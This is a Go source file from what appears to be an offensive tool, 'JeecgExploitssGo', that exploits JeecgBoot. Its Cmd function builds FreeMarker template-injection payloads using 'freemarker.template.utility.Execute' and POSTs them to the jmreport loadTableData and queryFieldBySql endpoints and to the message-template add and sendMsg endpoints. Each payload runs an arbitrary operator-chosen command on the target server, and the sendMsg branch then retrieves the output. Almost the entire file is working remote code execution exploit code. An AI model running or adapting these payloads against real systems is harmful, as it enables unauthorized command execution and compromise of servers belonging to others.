package Core

import (
	common "JeecgExploitssGo/Common"
	"math/rand"
	"os"
	"strconv"
	"strings"
)

/*
func requestFunc(url, body, token string) []byte {
	request, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		common.Colors(common.ColorRed).Printf("[-]构造请求失败, %v\n", err)
		return nil
	}

	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Access-Token", token)

	tls := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tls,
		Timeout:   time.Second * 30,
	}

	response, err := client.Do(request)

}*/

func Cmd(cmd string) {
	switch VulName {
	case "loadTableData":
		loadTableData_poc_1 := "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"" + cmd + "\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}"

		url := common.JoinURL(Urls, "jmreport/loadTableData")
		body := HandleRequest(url, Token, "POST", []byte(loadTableData_poc_1))
		if !HandleFunc("loadTableData_poc_1", url, []byte(loadTableData_poc_1), body, &common.LoadTableData{}) {
			os.Exit(0)
		}

		os.Exit(0)

	case "queryFieldBySql":
		queryFieldBySql := "{\"sql\":\"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ex(\\\"" + cmd + "\\\") }'\"}"

		url := common.JoinURL(Urls, "jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123")
		body := HandleRequest(url, Token, "POST", []byte(queryFieldBySql))
		if !HandleFunc("loadTableData_poc_1", url, []byte(queryFieldBySql), body, &common.QueryFieldBySql{}) {
			os.Exit(0)
		}

		// 单独利用漏洞不执行RoutineRequest()函数
		os.Exit(0)

	case "sendMsg":
		r := rand.Intn(1000)

		// 创建发送模板
		sendMsg_add := "{\"templateType\":\"1\",\"templateCode\":\"" + strconv.Itoa(r) + "\",\"templateName\":\"test\",\"templateContent\":\"${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"" + cmd + "\\\")}\"}"

		addURL := common.JoinURL(Urls, "sys/message/sysMessageTemplate/add")
		_ = HandleRequest(addURL, Token, "POST", []byte(sendMsg_add))

		// 发送模板
		sendMsg_sendMsg := "{\"templateCode\":\"" + strconv.Itoa(r) + "\",\"testData\":\"{}\",\"receiver\":\"\",\"msgType\":\"1\"}"

		sendMsgURL := common.JoinURL(Urls, "sys/message/sysMessageTemplate/sendMsg")
		body := HandleRequest(sendMsgURL, Token, "POST", []byte(sendMsg_sendMsg))
		if !strings.Contains(string(body), "成功") {
			os.Exit(1)
		}

		// 获取结果
		api := "sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10"
		urls := common.JoinURL(Urls, api)
		resultBody := HandleRequest(urls, Token, "GET", nil)
		if !HandleFunc("freemaker", urls, nil, resultBody, &common.SendMsg{}) {
			os.Exit(1)
		}
		os.Exit(0)

	}

	// http.NewRequest("POST", url, nil)
}
